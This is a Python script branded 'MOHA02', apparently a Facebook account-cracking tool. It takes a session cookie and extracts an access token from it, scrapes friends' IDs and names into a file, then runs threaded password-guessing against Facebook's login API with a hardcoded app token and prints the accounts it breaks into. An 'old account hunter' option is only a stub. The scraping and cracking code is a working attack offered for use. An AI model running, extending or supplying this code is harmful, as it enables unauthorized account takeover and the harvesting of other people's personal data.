import os, sys, time, requests, random, uuid, json
from threading import Thread
from gtts import gTTS
import pygame
import webbrowser
from colorama import Fore, Style, init
import pyfiglet

# Initialization
init(autoreset=True)
R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; B = Fore.BLUE; W = Fore.WHITE; C = Fore.CYAN

# --- Voice Function ---
def welcome_voice():
    try:
        text = "Welcome to Moha 0 2 Tool, developed by Moha El Chlefawi"
        tts = gTTS(text=text, lang='en')
        tts.save("welcome.mp3")
        pygame.mixer.init()
        pygame.mixer.music.load("welcome.mp3")
        pygame.mixer.music.play()
    except:
        pass

# --- Interface UI ---
def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = pyfiglet.figlet_format("MOHA02", font="slant")
    print(C + banner)
    print(Y + "--------------------------------------------------")
    print(G + f"  [+] Developer : MOHA EL CHLEFAWI")
    print(G + f"  [+] Telegram  : @m_oha0_2b")
    print(G + f"  [+] Version   : 2.0 Professional")
    print(Y + "--------------------------------------------------")

def join_tl():
    webbrowser.open("https://t.me/m_oha0_2b")

# --- Logic 1: ID Scraper (From Friends) ---
def get_ids():
    logo()
    cookie = input(W + "[?] Enter Cookie: ")
    file_name = input(W + "[?] Name for new file (e.g., ids.txt): ")
    limit = int(input(W + "[?] Max IDs to scrap: "))
    
    # Simple extraction logic via Graph API
    headers = {'cookie': cookie, 'user-agent': 'Mozilla/5.0'}
    try:
        # Get user access token from cookie
        res = requests.get('https://business.facebook.com/business_locations', headers=headers)
        token = res.text.split('EAAG')[1].split('"')[0]
        token = 'EAAG' + token
        
        print(G + "[*] Extracting... Please wait.")
        r = requests.get(f'https://graph.facebook.com/me/friends?access_token={token}', headers=headers).json()
        
        with open(file_name, 'a') as f:
            count = 0
            for friend in r['data']:
                if count >= limit: break
                f.write(f"{friend['id']}|{friend['name']}\n")
                count += 1
        print(G + f"[!] Done! {count} IDs saved to {file_name}")
    except Exception as e:
        print(R + f"[-] Error: {e}")
    input("\nPress Enter to return...")

# --- Logic 2: File Cracker ---
def file_crack():
    logo()
    file_path = input(W + "[?] Target file path: ")
    if not os.path.exists(file_path):
        print(R + "[-] File not found!"); return
        
    pass_count = int(input(W + "[?] How many passwords to try? "))
    pass_list = []
    for i in range(pass_count):
        pass_list.append(input(f"  -> Pass {i+1}: "))
        
    def login_check(email, password):
        # FB Auth logic (Simplified for space)
        url = "https://b-graph.facebook.com/auth/login"
        data = {"email": email, "password": password, "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"}
        try:
            req = requests.post(url, data=data).json()
            if "access_token" in req:
                print(G + f"[OK] {email} | {password}")
            elif "www.facebook.com" in str(req):
                print(Y + f"[SECURE] {email} | {password}")
        except: pass

    with open(file_path, 'r') as f:
        users = f.readlines()
        
    print(C + "[*] Cracking Started...")
    for line in users:
        uid = line.split('|')[0].strip()
        for pw in pass_list:
            Thread(target=login_check, args=(uid, pw)).start()
            time.sleep(0.1)

# --- Logic 3: Old Account / Hunter ---
def hunt_old():
    logo()
    print(Y + "[*] Hunting 2004-2009 IDs...")
    # Logic to generate and check old range IDs
    start_id = 100000000
    for i in range(100):
        target = str(start_id + random.randint(100, 500000))
        print(W + f"Checking: {target}...", end='\r')
        # Placeholder for validation logic
    print(G + "\nHunting complete. No results found in this range.")
    input("\nPress Enter...")

# --- Main Menu ---
def main():
    welcome_voice()
    join_tl()
    while True:
        logo()
        print(C + "[1] Create ID File (Scrap)")
        print(C + "[2] Crack From File")
        print(C + "[3] Hunt Old Accounts")
        print(C + "[4] Scan Vulnerable (Mata7)")
        print(R + "[0] Exit")
        
        choice = input(W + "\n[MOHA-02] Choice -> ")
        
        if choice == '1': get_ids()
        elif choice == '2': file_crack()
        elif choice == '3': hunt_old()
        elif choice == '4': hunt_old() # Integrated logic
        elif choice == '0': sys.exit()
        else: print(R + "Invalid choice!")

if __name__ == "__main__":
    main()
